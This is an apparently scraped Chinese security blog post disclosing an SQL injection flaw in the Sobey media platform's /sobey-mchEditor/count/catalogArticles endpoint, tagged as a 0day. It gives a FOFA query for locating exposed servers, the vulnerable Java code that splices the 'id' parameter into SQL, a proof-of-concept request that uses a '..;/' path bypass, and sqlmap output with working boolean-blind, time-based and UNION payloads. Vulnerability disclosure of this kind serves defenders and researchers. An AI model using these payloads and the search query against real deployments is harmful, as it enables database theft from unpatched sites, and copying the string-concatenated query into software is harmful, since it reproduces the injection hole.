---
title: "索贝融媒体 /sobey-mchEditor/count/catalogArticles SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-count-catalogArticles-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditorcountcatalogarticles-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/count/catalogArticles SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/20 08:26
- 632浏览
- [0评论](#comment)
- 30分钟阅读

深入探索

安全

计算机安全

软件

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/count/catalogArticles 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`count/catalogArticles`的实现逻辑

```
@RequestMapping(
    value = {"/catalogArticles"},
    method = {RequestMethod.GET}
)
public Response catalogList(@RequestParam(value = "parentId",defaultValue = "",required = false) String parentId, @RequestParam(value = "id",defaultValue = "",required = false) String id, @RequestParam(value = "status",required = false) String status, @RequestParam(value = "startTime",required = false) String startTime, @RequestParam(value = "endTime",required = false) String endTime) {
    Response response = new Response();

    try {
        String catalogType = "1,2";
        QueryBuilder qb = new QueryBuilder("select c.ID,c.ParentID,c.TreeLevel,c.Name,c.InnerCode,COUNT(a.id) count from ZCCatalog c LEFT JOIN zcnarticle a on c.ID=a.catalogID and a.ifval='1'  ");
        if (StringUtil.isNotEmpty(status)) {
            qb.append(" and a.status = ? ", status);
        }

        if (StringUtil.isNotEmpty(startTime)) {
            qb.append(" and a.createDate > ? ", startTime);
        }

        if (StringUtil.isNotEmpty(endTime)) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            Date date = sdf.parse(endTime + " 23:59:59");
            qb.append(" and a.createDate < ? ", date);
        }

        qb.append(" Where c.Type in (1,2) and c.SiteID = ? ", 1);
        if (StringUtil.isNotEmpty(id)) {
            qb.append(" and c.id in (" + id + ") ");
        }

        if (StringUtil.isNotEmpty(parentId)) {
            qb.append(" and c.ParentID=?  ", parentId);
        }

        qb.append(" GROUP BY c.ID ");
        DataTable dt = qb.executeDataTable();
```

深入探索

文本剥离工具

Windows安全工具

VPN服务

参数**id**无任何过滤或校验处理，被直接拼接到wzSql这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /sobey-mchEditor/js/..;/count/catalogArticles?id=)SQLI_POC&siteCode=1&token=1 HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/count/catalogArticles SQL注入漏洞](images/img-001-6faf6783ed26.webp)](https://image.mrxn.net/bba1e7a1e595438884c940c96baa427c.webp)

通过联合注入获取到数据库用户

代码安全审计

[sqlmap](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/catalogArticles?id=-3328) OR 2183=2183 AND (1036=1036&siteCode=1&token=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/catalogArticles?id=1) OR (SELECT 9082 FROM (SELECT(SLEEP(5)))LrrB) AND (7972=7972&siteCode=1&token=1

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/count/catalogArticles?id=1) UNION ALL SELECT NULL,CONCAT(0x7171786b71,0x765168754859755157466f6c41765357444f786a74744b457251546b63584279565867484c644d5a,0x716b626b71),NULL,NULL,NULL,NULL-- -&siteCode=1&token=1
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
